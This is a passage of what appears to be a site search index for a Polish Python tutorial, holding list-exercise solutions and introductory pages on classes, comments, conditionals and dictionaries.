2","text":""},{"location":"programming/python/exercises/lists/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> <li>\\(k\\) - liczba naturalna, \\(1&lt;=k&lt;=n\\)</li> </ul>"},{"location":"programming/python/exercises/lists/solution-2/#wynik","title":"Wynik","text":"<ul> <li>\\(a_k\\) - \\(k\\)-ta podana liczba</li> </ul>"},{"location":"programming/python/exercises/lists/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\ntab = [int(input(f\"Podaj liczb\u0119 nr {i + 1}: \")) for i in range(n)]\nk = int(input(\"Podaj numer elementu: \"))\n\nprint(f\"Element numer {k}: {tab[k - 1]}\")\n</code></pre>"},{"location":"programming/python/exercises/lists/solution-2/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":"<p>Na pocz\u0105tku wczytujemy od u\u017cytkownika liczb\u0119 element\u00f3w i zapisujemy j\u0105 w zmiennej \\(n\\) (linia 1).</p> <p>Nast\u0119pnie tworzymy list\u0119 wczytuj\u0105c do niej warto\u015bci (linia 2).</p> <p>Nast\u0119pnie wczytujemy od u\u017cytkownika numer elementu, kt\u00f3ry nale\u017cy wypisa\u0107 (linia 3).</p> <p>Teraz pozosta\u0142o wypisa\u0107 w\u0142a\u015bciwy element. Poniewa\u017c tablica jest numerowana (indeksowana) od zera, nale\u017cy wypisa\u0107 element pod indeksem \\(k - 1\\) (linia 5).</p>"},{"location":"programming/python/exercises/lists/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/python/exercises/lists/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> <li>\\(p, k\\) - dwie liczby naturalna, \\(1&lt;=p,k&lt;=n\\), \\(p &lt;= k\\)</li> </ul>"},{"location":"programming/python/exercises/lists/solution-3/#wynik","title":"Wynik","text":"<ul> <li>\\(a_p+a_{p+1}+a_{p+2}+...+a_{k}\\) - suma warto\u015bci na pozycjach od \\(p\\) do \\(k\\)</li> </ul>"},{"location":"programming/python/exercises/lists/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\ntab = [int(input(f\"Podaj liczb\u0119 nr {i + 1}: \")) for i in range(n)]\np = int(input(\"Podaj pocz\u0105tek zakresu: \"))\nk = int(input(\"Podaj koniec zakresu: \"))\n\np -= 1\nsuma = sum(tab[p:k])\n\nprint(f\"Suma element\u00f3w z podanego zakresu wynosi {suma}\")\n</code></pre>"},{"location":"programming/python/exercises/lists/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/python/exercises/lists/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(t1[n],\\ t2[n]\\) - dwie listy liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/python/exercises/lists/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Tablica powsta\u0142a poprzez dodanie do siebie warto\u015bci z list \\(t1\\) i \\(t2\\) </li> </ul>"},{"location":"programming/python/exercises/lists/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\n\nt1 = [int(input(f\"Podaj liczb\u0119 nr {i + 1} z pierwszej tablicy: \")) for i in range(n)]\nt2 = [int(input(f\"Podaj liczb\u0119 nr {i + 1} z drugiej tablicy: \")) for i in range(n)]\nt3 = [el1 + el2 for el1, el2 in zip(t1, t2)]\n\nprint(f\"Wynikowa tablica: {t3}\")\n</code></pre>"},{"location":"programming/python/exercises/lists/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/python/exercises/lists/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;2\\)</li> </ul>"},{"location":"programming/python/exercises/lists/solution-5/#wynik","title":"Wynik","text":"<ul> <li>\\(fib[n]\\) - lista zawieraj\u0105ca \\(n\\) kolejnych liczb Fibonacciego</li> </ul>"},{"location":"programming/python/exercises/lists/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\n\nfib = [1, 1]\n\nfor i in range(2, n):\n    fib.append(fib[i - 1] + fib[i - 2])\n\nprint(f\"Kolejne {n} liczb Fibonacciego: {fib}\")\n</code></pre>"},{"location":"programming/python/exercises/lists/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/python/exercises/lists/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/lists/solution-6/#wynik","title":"Wynik","text":"<ul> <li>\\(mno[n][n]\\) - dwuwymiarowa lista reprezentuj\u0105ca tabliczk\u0119 mno\u017cenia liczb z zakresu \\([0,n-1]\\), gdzie \\(mno[i][j]=i*j\\)</li> </ul>"},{"location":"programming/python/exercises/lists/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>from pprint import pprint\n\nn = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\n\nmno = [[i * j for j in range(n)] for i in range(n)]\n\npprint(mno)\n</code></pre>"},{"location":"programming/python/exercises/lists/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"programming/python/exercises/lists/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/python/exercises/lists/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Komunikat \"niemalejaco\" je\u017celi elementy tablicy posortowane s\u0105 niemalej\u0105co</li> <li>Komunikat \"nierosnaco\" je\u017celi elementy tablicy posortowane s\u0105 nierosn\u0105co</li> <li>Komunikat \"nieposortowane\" je\u017celi elementy tablicy nie s\u0105 posortowane</li> </ul>"},{"location":"programming/python/exercises/lists/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\ntab = [int(input(f\"Podaj liczb\u0119 nr {i + 1}: \")) for i in range(n)]\n\nniemalejaco = True\nnierosnaco = True\n\nfor i in range(1, n):\n  if tab[i] &gt; tab[i - 1]:\n    nierosnaco = False\n\n  if tab[i] &lt; tab[i - 1]:\n    niemalejaco = False\n\nif nierosnaco:\n  print(\"nierosn\u0105co\")\nelif niemalejaco:\n  print(\"niemalej\u0105co\")\nelse:\n  print(\"nieposortowane\")\n</code></pre>"},{"location":"programming/python/exercises/lists/solution-8/","title":"Rozwi\u0105zanie 8","text":""},{"location":"programming/python/exercises/lists/solution-8/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/solution-8/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/solution-8/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(p, k\\) - dwie liczby naturalna, \\(p &lt;= k\\)</li> </ul>"},{"location":"programming/python/exercises/lists/solution-8/#wynik","title":"Wynik","text":"<ul> <li>\\(n\\)-elementowa lista wype\u0142niona losowymi warto\u015bciami z przedzia\u0142u \\([p, k]\\)</li> </ul>"},{"location":"programming/python/exercises/lists/solution-8/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>import random\n\nn = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\np = int(input(\"Podaj pocz\u0105tek zakresu: \"))\nk = int(input(\"Podaj koniec zakresu: \"))\n\ntab = [random.randint(p, k) for _ in range(n)]\n\nprint(tab)\n</code></pre>"},{"location":"programming/python/introduction/","title":"Wprowadzenie","text":"<p>Danger</p>"},{"location":"programming/python/introduction/#uwaga","title":"Uwaga","text":"<p>To nie jest tutorial programowania. Za\u0142o\u017cenie jest takie, \u017ce wiesz ju\u017c co nieco o programowaniu, by\u0107 mo\u017ce znasz inny j\u0119zyk programowania i chcesz si\u0119 dowiedzie\u0107 jak podstawowe konstrukcje wygl\u0105daj\u0105 w j\u0119zyku Python 3.</p> <p>Nie b\u0119dziemy tutaj t\u0142umaczy\u0107 czym jest p\u0119tla czy instrukcja warunkowe, a jedynie poka\u017cemy, jak te konstrukcje wygl\u0105daj\u0105 w j\u0119zyku Python 3.</p> <p>Je\u017celi dopiero zaczynasz, zapoznaj si\u0119 najpierw z wprowadzeniem do algorytm\u00f3w: Wprowadzenie</p>"},{"location":"programming/python/introduction/#srodowisko-lokalne","title":"\u015arodowisko lokalne","text":""},{"location":"programming/python/introduction/#instalacja-interpretera","title":"Instalacja interpretera","text":"<p>Pobieramy interpreter j\u0119zyka Python 3 w jak najnowszej wersji z nast\u0119puj\u0105cej strony (przycisk \"Download Python\" na samej g\u00f3rze strony).</p>"},{"location":"programming/python/introduction/#instalacja-srodowiska","title":"Instalacja \u015brodowiska","text":"<p>Pobieramy darmowe \u015brodowisko Pycharm Community Edition. Pami\u0119tamy, aby wybra\u0107 wersj\u0119 przeznaczon\u0105 dla naszego systemu operacyjnego. Instalujemy post\u0119puj\u0105c zgodnie z instrukcjami instalatora.</p>"},{"location":"programming/python/introduction/#srodowiska-webowe","title":"\u015arodowiska webowe","text":"<p>W przeciwie\u0144stwie do \u015brodowisk lokalnych, \u015brodowiska webowe dost\u0119pne s\u0105 z poziomu przegl\u0105darki i nie wymagaj\u0105 \u017cadnej dodatkowej instalacji. Ma to oczywi\u015bcie swoje wady i zalety. \u015arodowiska webowe zazwyczaj dzia\u0142aj\u0105 wolniej i maj\u0105 swoje ograniczenia.</p>"},{"location":"programming/python/introduction/#ideone","title":"Ideone","text":"<p>Dosy\u0107 podstawowy kompilator webowy. Posiada wsparcie dla wielu j\u0119zyk\u00f3w. Do jego zalet mo\u017cna zaliczy\u0107 stosunkowo szybk\u0105 kompilacj\u0119 i mo\u017cliwo\u015b\u0107 korzystania bez rejestracji, a tak\u017ce \u0142atwo\u015b\u0107 udost\u0119pniania swoich kod\u00f3w. Do minus\u00f3w mo\u017cna zaliczy\u0107 brak interaktywno\u015bci - ca\u0142e wej\u015bcie musimy wprowadzi\u0107 w specjalnym oknie, przed uruchomieniem programu.</p> <p>Rozbudowane narz\u0119dzie webowe, kt\u00f3re wymaga jednak utworzenia darmowego konta. Posiada wsparcie dla wielu j\u0119zyk\u00f3w i pozwala na tworzenie rozbudowanych projekt\u00f3w ze z\u0142o\u017con\u0105 struktur\u0105 plik\u00f3w, a tak\u017ce na wprowadzanie w\u0142asnych opcji kompilacji.</p>"},{"location":"programming/python/introduction/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/python/introduction/classes/","title":"Klasy","text":"<p>Definicj\u0119 klasy zaczynamy od s\u0142owa kluczowego <code>class</code>, a nast\u0119pnie podajemy nazw\u0119 klasy, zazwyczaj zaczynaj\u0105c od wielkiej litery. Je\u017celi klasa po czym\u015b dziedziczy, to podajemy to wewn\u0105trz nawias\u00f3w okr\u0105g\u0142ych po nazwie klasy.</p>"},{"location":"programming/python/introduction/classes/#klasa-abstrakcyjna","title":"Klasa abstrakcyjna","text":"<p>Aby zdefiniowa\u0107 klas\u0119 abstrakcyjn\u0105, kt\u00f3rej obiektu nie mo\u017cemy utworzy\u0107, ale mo\u017cemy j\u0105 wykorzystywa\u0107 w dziedziczeniu, skorzystamy z klasy bazowej <code>ABC</code> z modu\u0142u <code>abc</code>. Z tego samego modu\u0142u przydatny b\u0119dzie tak\u017ce dekorator <code>abstractmethod</code> za pomoc\u0105 kt\u00f3rego mo\u017cemy oznaczy\u0107 wybran\u0105 metod\u0119 klasy abstrakcyjnej jako abstrakcyjn\u0105, kt\u00f3ra musi zosta\u0107 zaimplementowana w klasie pochodnej.</p> <pre><code>from abc import ABC, abstractmethod\n\nclass Figure(ABC):\n    \"\"\"Klasa abstrakcyjna reprezentuj\u0105ca figur\u0119.\n    Aby utworzy\u0107 klas\u0119 abstrakcyjn\u0105, dziedziczymy po specjalnej klasie ABC, kt\u00f3r\u0105 nale\u017cy zaimportowa\u0107 z pakietu abc.\n    \"\"\"\n\n    @abstractmethod\n    def area(self) -&gt; float:\n        \"\"\"Metoda obliczaj\u0105ca pole figury.\n        Metoda abstrakcyjna. \n        Metody abstrakcyjne oznaczamy za pomoc\u0105 dekoratora @abstractmethod z pakietu abc.\n        Musz\u0105 zosta\u0107 przeci\u0105\u017cone w klasie potomnej.\n        \"\"\"\n        pass\n\n    @abstractmethod\n    def perimeter(self) -&gt; float:\n        \"\"\"Metoda obliczaj\u0105ca obw\u00f3d figury.\n        Metoda abstrakcyjna.\n        \"\"\"\n        pass\n\n\nif __name__ = \"__main__\":\n    figure = Figure() # B\u0141\u0104D! Nie mo\u017cemy tworzy\u0107 obiektu klasy abstrakcyjnej\n</code></pre>"},{"location":"programming/python/introduction/classes/#dziedziczenie","title":"Dziedziczenie","text":"<p>Standardowe klasy powinny mie\u0107 zdefiniowany w\u0142asny konstruktor/inicjalizator: metod\u0119 <code>__init__</code>.</p> <p>Do ka\u017cdej metody w klasie przekazujemy jako pierwszy parametr <code>self</code>, kt\u00f3ry jest odniesieniem do obiektu klasy, na kt\u00f3rej pracujemy (podobnie jak <code>this</code> w niekt\u00f3rych j\u0119zykach).</p> <pre><code>from random import randint\nfrom math import pi, sin, radians\n\nclass Quad(Figure):\n    \"\"\"Klasa reprezentuj\u0105ca czworok\u0105t. \n    Dziedziczy po klasie Figure.\n    \"\"\"\n\n    def __init__(self, side1: float, side2: float, side3: float, side4: float, diagonal1: float, diagonal2: float, angle: float):\n        \"\"\"Konstruktor klasy.\n\n        Argumenty:\n            side1, side2, side3, side4 - d\u0142ugo\u015bci bok\u00f3w\n            diagonal1, diagonal2 - d\u0142ugo\u015bci przek\u0105tnych\n            alpha - k\u0105t pomi\u0119dzy przek\u0105tnymi\n        \"\"\"\n\n        # Zmienne zaczynaj\u0105ce si\u0119 od pojedy\u0144czego znaku pod\u0142ogi traktowane s\u0105 umownie jako protected.\n        self._sides = [side1, side2, side3, side4]\n\n        # Zmienne zaczynaj\u0105ce si\u0119 od podw\u00f3jnego znaku pod\u0142ogi traktowane s\u0105 umownie jako prywatne.\n        self.__d1 = diagonal1\n        self.__d2 = diagonal2\n        self.__angle = angle\n\n    def area(self) -&gt; float:\n        \"\"\"Metoda obliczaj\u0105ca pole czworok\u0105ta na podstawie d\u0142ugo\u015bci przek\u0105tnych i k\u0105ta alpha pomi\u0119dzy nimi.\n        Metoda publiczna, dziedziczona przez potomk\u00f3w\n        \"\"\"\n        return (self.__d1 * self.__d2 * sin(radians(self.__angle))) / 2\n\n    def perimeter(self) -&gt; float:\n        \"\"\"Metoda obliczaj\u0105ca obw\u00f3d figury jako sum\u0119 d\u0142ugo\u015bci bok\u00f3w.\n        Metoda publiczna, dziedziczona przez potomk\u00f3w.\n        \"\"\"\n        return sum(self._sides)\n</code></pre>"},{"location":"programming/python/introduction/classes/#atrybuty-klasy","title":"Atrybuty klasy","text":"<p>Zmienne wewn\u0105trz klasy, kt\u00f3rych nazwa zaczyna si\u0119 od podw\u00f3jnego znaku pod\u0142ogi, uznajemy za prywatne. Zmienne te nie mog\u0105 by\u0107 u\u017cyte na zewn\u0105trz klasy.</p> <p>Pozosta\u0142e zmienne s\u0105 generalnie publiczne, chocia\u017c te, kt\u00f3rych nazwa zaczyna si\u0119 od pojedy\u0144czego znaku pod\u0142ogi uznajemy za protected, tzn. dost\u0119pne tylko w klasach pochodnych.</p> <p>Aby mie\u0107 kontrol\u0119 nad dost\u0119pem do zmiennych w obiekcie, mo\u017cemy skorzysta\u0107 z dekorator\u00f3w <code>property</code> oraz <code>setter</code> odpowiednio do tworzenia atrybut\u00f3w do odczytu i zapisu.</p> <pre><code>class Rectangle(Quad):\n    \"\"\"Klasa reprezentuj\u0105ca prostok\u0105t.\n    Dziedziczy po klasie Quad reprezentuj\u0105cej czworok\u0105t, jako \u017ce prostok\u0105t jest czworok\u0105tem.\n    \"\"\"\n\n    def __init__(self, height: float, width: float):\n        \"\"\"Konstruktor klasy. \n        Jako \u017ce klasa Rectangle dziedziczy po klasie Quad wymagane jest wywo\u0142anie konstruktora klasy rodzica.\n        Wykonujemy to pisz\u0105c super().__init__(argumenty).\n\n        Argumenty:\n            height - wysoko\u015b\u0107 prostok\u0105ta\n            width - szeroko\u015b\u0107 prostok\u0105ta\n        \"\"\"\n        super().__init__(height, width, height, width, 0, 0, 0)\n\n    @property\n    def height(self) -&gt; float:\n        \"\"\"Wysoko\u015b\u0107 prostok\u0105ta. Getter.\n        Atrybut klasy do odczytu. Dzia\u0142a podobnie jak getter z Javy.\n        \"\"\"\n        return self._sides[0]\n\n    @height.setter\n    def height(self, value: float):\n        \"\"\"Wysoko\u015b\u0107 prostok\u0105ta. Setter.\n        Atrybut klasy do zapisu. Dzia\u0142a podobnie jak setter z Javy.\n        \"\"\"\n        self._sides[0] = value\n        self._sides[2] = value\n\n    @property\n    def width(self) -&gt; float:\n        \"\"\"Szeroko\u015b\u0107 prostok\u0105ta. Getter.\"\"\"\n        return self._sides[1]\n\n    @width.setter\n    def width(self, value: float):\n        \"\"\"Szeroko\u015b\u0107 prostok\u0105ta. Setter.\"\"\"\n        self._sides[1] = value\n        self._sides[3] = value\n\n    def area(self) -&gt; float:\n        \"\"\"Metoda obliczaj\u0105ca pole prostok\u0105ta przemna\u017caj\u0105c wysoko\u015b\u0107 i szeroko\u015b\u0107.\"\"\"\n        return self.width * self.height\n</code></pre> <pre><code>class Square(Rectangle):\n    \"\"\"Klasa reprezentuj\u0105ca kwadrat.\n    Dziedziczy po klasie Rectangle reprezentuj\u0105cej prostok\u0105t, jako \u017ce kwadrat jest prostok\u0105tem.\n    \"\"\"\n\n    def __init__(self, size: float):\n        \"\"\"Konstruktor klasy. \n        Jako \u017ce klasa Square dziedziczy po klasie Rectangle wymagane jest wywo\u0142anie konstruktora klasy rodzica.\n        Wykonujemy to pisz\u0105c super().__init__(argumenty).\n\n        Argumenty:\n            size - d\u0142ugo\u015b\u0107 boku\n        \"\"\"\n        super().__init__(size, size)\n\n\nclass Ellipse(Figure):\n    \"\"\"Klasa reprezentuj\u0105ca elips\u0119.\n    Dziedziczy po klasie Figure.\n    \"\"\"\n\n    def __init__(self, radius1: float, radius2: float):\n        \"\"\" \n        Konstruktor klasy. \n        Jako \u017ce klasa Ellipse dziedziczy po klasie abstrakcyjnej Figure, nie wywo\u0142ujemy konstruktora klasy rodzica.\n\n        Argumenty:\n            radius1 - pierwszy promie\u0144 elipsy\n            radius2 - drugi promie\u0144 elipsy\n        \"\"\"\n        self._radius1 = radius1\n        self._radius2 = radius2\n\n    def area(self):\n        \"\"\"Metoda obliczaj\u0105ca pole elipsy. Nie zosta\u0142a zaimplementowana.\"\"\"\n        raise NotImplemented\n\n    def perimeter(self):\n        \"\"\"Metoda obliczaj\u0105ca obw\u00f3d elipsy. Nie zosta\u0142a zaimplementowana.\"\"\"\n        raise NotImplemented\n\n\nclass Circle(Ellipse):\n    \"\"\"Klasa reprezentuj\u0105ca ko\u0142o.\n    Dziedziczy po klasie Ellipse reprezentuj\u0105cej elips\u0119, jako \u017ce ko\u0142o jest te\u017c elips\u0105.\n    \"\"\"\n\n    def __init__(self, radius: float):\n        \"\"\"Konstruktor klasy. \n        Jako \u017ce klasa Circle dziedziczy po klasie Ellipse wymagane jest wywo\u0142anie konstruktora klasy rodzica.\n        Wykonujemy to pisz\u0105c super().__init__(argumenty).\n\n        Argumenty:\n            radius - promie\u0144 ko\u0142a\n        \"\"\"\n        super().__init__(radius, radius)\n\n    @classmethod\n    def one(cls):\n        \"\"\"Metoda klasowa tworz\u0105ca ko\u0142o o promieniu 1. \n        Taki spos\u00f3b pozwala na utworzenie dodatkowych \"konstruktor\u00f3w\".\n        \"\"\"\n        return cls(1)\n\n    @property\n    def radius(self):\n        \"\"\"Promie\u0144 ko\u0142a. Getter.\n        Warto\u015b\u0107 tylko do odczytu, nie ma metody setter.\n        \"\"\"\n        return self._radius1\n\n    def area(self) -&gt; float:\n        \"\"\"Metoda obliczaj\u0105ca pole ko\u0142a.\"\"\"\n        return pi * (self.radius ** 2)\n\n    def perimeter(self) -&gt; float:\n        \"\"\"Metoda obliczaj\u0105ca obw\u00f3d ko\u0142a.\"\"\"\n        return 2 * pi * self.radius\n\n\nif __name__ == \"__main__\":\n    # figure = Figure() - B\u0142\u0105d, nie mo\u017cemy utworzy\u0107 obiektu klasy z abstrakcyjnymi metodami\n    quad = Quad(1, 2, 3, 4, 5, 6, 30)\n    rectangle = Rectangle(1, 2)\n    square = Square(1)\n    ellipse = Ellipse(1, 2)\n    circle = Circle(5)\n\n    quad.__d1 = 10  # Dzia\u0142a, ale nie jest poprawne, __d1 jest prywatne\n    print(f\"quad.__d1 = {quad.__d1}\")  # Dzia\u0142a, ale nie jest poprawne, __d1 jest prywatne\n\n    quad._sides[0] = 10  # Dzia\u0142a, ale nie jest poprawne, _sides jest protected\n    print(f\"quad._sides[0] = {quad._sides[0]}\")  # Dzia\u0142a, ale nie jest poprawne, _sides jest protected\n\n    rectangle.width = 10  # Dzia\u0142a\n    print(f\"rectangle.width = {rectangle.width}\")  # Dzia\u0142a\n\n    # circle.radius = 10 # Nie dzia\u0142a, nie ma settera\n    print(f\"circle.radius = {circle.radius}\")  # Dzia\u0142a\n\n    circle_one = Circle.one()  # Wywo\u0142anie metody klasowej\n\n    print(f\"kwadrat jest figur\u0105: {isinstance(square, Figure)}\")\n    print(f\"kwadrat jest czworok\u0105tem: {isinstance(square, Quad)}\")\n    print(f\"kwadrat jest prostok\u0105tem: {isinstance(square, Rectangle)}\")\n    print(f\"kwadrat jest kwadratem: {isinstance(square, Square)}\")\n    print(f\"kwadrat jest elips\u0105: {isinstance(square, Ellipse)}\")\n    print(f\"kwadrat jest ko\u0142em: {isinstance(square, Circle)}\")\n\n    print(f\"kwadrat jest typu: {type(square)}\")\n\n    selection = randint(1, 5)\n\n    figure = None\n\n    if selection == 1:\n        figure = Quad(1, 2, 3, 4, 6, 7, 30)\n    elif selection == 2:\n        figure = Rectangle(1, 2)\n    elif selection == 3:\n        figure = Square(1)\n    elif selection == 4:\n        figure = Ellipse(1, 2)\n    elif selection == 5:\n        figure = Circle(1)\n\n    print(f\"Wylosowana figura jest typu: {type(figure)}\")\n\n    if isinstance(figure, Rectangle):\n        # Sprawdzamy, czy figure jest prostok\u0105tem, a je\u015bli tak, to wypisujemy jego wysoko\u015b\u0107.\n        # Przy takim podej\u015bciu \u015brodowisko b\u0119dzie podpowiada\u0107 metody dost\u0119pne w klasie Rectangle i traktowa\u0107 figure jako Rectangle.\n        print(f\"Wysoko\u015b\u0107: {figure.height}\")\n</code></pre>"},{"location":"programming/python/introduction/comments/","title":"Komentarze","text":"<p>Jak i w innych j\u0119zykach, tak\u017ce w j\u0119zyku Python mo\u017cemy dodawa\u0107 komentarze, zar\u00f3wno klasyczne jak i dokumentacyjne.</p>"},{"location":"programming/python/introduction/comments/#jednolinijkowe","title":"Jednolinijkowe","text":"<p>Komentarze jednolinijkowe w j\u0119zyku Python zaczynaj\u0105 si\u0119 od znaku <code>#</code></p>"},{"location":"programming/python/introduction/comments/#przykad","title":"Przyk\u0142ad","text":"<pre><code># To jest komentarz\nzmienna = 5  # To jest kolejny komentarz\n</code></pre>"},{"location":"programming/python/introduction/comments/#wielolinijkowe","title":"Wielolinijkowe","text":"<p>W j\u0119zyku Python nie ma typowych komentarzy wielolinijkowych. Zamiast tego u\u017cywamy wielu komentarzy jednolinijkowych. Alternatywnie mo\u017cna skorzysta\u0107 ze sk\u0142adni pozwalaj\u0105cej na tworzenie wielolinijkowych tekst\u00f3w. Je\u017celi nie przypiszemy ich do \u017cadnej zmiennej, ich warto\u015b\u0107 zostanie zignorowana, to znaczy potraktowana jak komentarz.</p>"},{"location":"programming/python/introduction/comments/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>\"\"\"\nTo jest tekst wielolinijkowy,\nkt\u00f3ry mo\u017ce zosta\u0107 potraktowany r\u00f3wnie\u017c jako komentarz.\n\"\"\"\n</code></pre>"},{"location":"programming/python/introduction/comments/#komentarze-dokumentacyjne","title":"Komentarze dokumentacyjne","text":"<p>W j\u0119zyku Python komentarze dokumentacyjne mog\u0105 by\u0107 zar\u00f3wno jednolinijkowe jak i wielolinijkowe. W obu przypadkach tworzymy je tak samo. To, co mo\u017ce odr\u00f3\u017cnia\u0107 Python od innych j\u0119zyk\u00f3w to fakt, \u017ce dokumentuj\u0105c funkcj\u0119 czy klas\u0119, komentarze umieszczamy wewn\u0105trz definicji, a nie przed ni\u0105.</p> <p>Istnieje co najmniej kilka r\u00f3\u017cnych format\u00f3w pisania dokumentacji. Jak to zwykle bywa, nale\u017cy wybra\u0107 jeden i si\u0119 go trzyma\u0107 w ca\u0142ym projekcie.</p>"},{"location":"programming/python/introduction/comments/#przykad-format-sphinx","title":"Przyk\u0142ad (format Sphinx)","text":"<pre><code>def add(a: int, b: int) -&gt; int :\n    \"\"\"Computes sum of two integers.\n\n    :param a: The first integer\n    :param b: The second integer\n\n    :returns: The sum of a and b\n    \"\"\"\n\n    return a + b\n</code></pre>"},{"location":"programming/python/introduction/condittional-instruction/","title":"Instrukcje warunkowe","text":"<p>Instrukcja warunkowa w j\u0119zyku Python wygl\u0105da bardzo podobnie jak i w innych j\u0119zykach. Standardowo, mo\u017cemy j\u0105 przedstawi\u0107 w trzech typowych konfiguracjach: prostej, rozwini\u0119tej i pe\u0142nej.</p>"},{"location":"programming/python/introduction/condittional-instruction/#prosta-instrukcja-warunkowa","title":"Prosta instrukcja warunkowa","text":"<pre><code>temperatura = int(input(\"Podaj temperatur\u0119: \"))\n\nif temperatura &lt; 5:\n    print(\"Zimno!\")\n</code></pre>"},{"location":"programming/python/introduction/condittional-instruction/#rozwinieta-instrukcja-warunkowa","title":"Rozwini\u0119ta instrukcja warunkowa","text":"<pre><code>temperatura = int(input(\"Podaj temperatur\u0119: \"))\n\nif temperatura &lt; 5:\n    print(\"Zimno!\")\nelse:\n    print(\"Cieplej!\")\n</code></pre>"},{"location":"programming/python/introduction/condittional-instruction/#pena-instrukcja-warunkowa","title":"Pe\u0142na instrukcja warunkowa","text":"<pre><code>temperatura = int(input(\"Podaj temperatur\u0119: \"))\n\nif temperatura &lt; 5:\n    print(\"Zimno!\")\nelif temperatura &lt; 20:\n    print(\"Umiarkowanie!\")\nelse:\n    print(\"Ciep\u0142o!\")\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/","title":"S\u0142owniki","text":"<p>S\u0142owniki w j\u0119zyku Python s\u0105 struktur\u0105 dynamiczn\u0105 s\u0142u\u017c\u0105c\u0105 do przechowywania par klucz-warto\u015b\u0107.</p>"},{"location":"programming/python/introduction/dictionaries/#inicjalizacja-sownika","title":"Inicjalizacja s\u0142ownika","text":""},{"location":"programming/python/introduction/dictionaries/#pusty-sownik","title":"Pusty s\u0142ownik","text":"<p>W celu utworzenia pustego s\u0142ownika wystarczy jako warto\u015b\u0107 zmiennej przypisa\u0107 <code>dict()</code>.</p> <pre><code>empty_dict = dict()\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#inicjalizacja-danymi-poczatkowymi","title":"Inicjalizacja danymi pocz\u0105tkowymi","text":"<p>Gdy tworzymy s\u0142ownik, mo\u017cemy wype\u0142ni\u0107 go pocz\u0105tkowymi warto\u015bciami. W tym celu u\u017cywamy notacji nawias\u00f3w klamrowych oraz par <code>klucz: warto\u015b\u0107</code>.</p> <pre><code>letters_dict = {\"a\": 1, \"b\": 2, \"c\": 3}\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#generowanie-sownika","title":"Generowanie 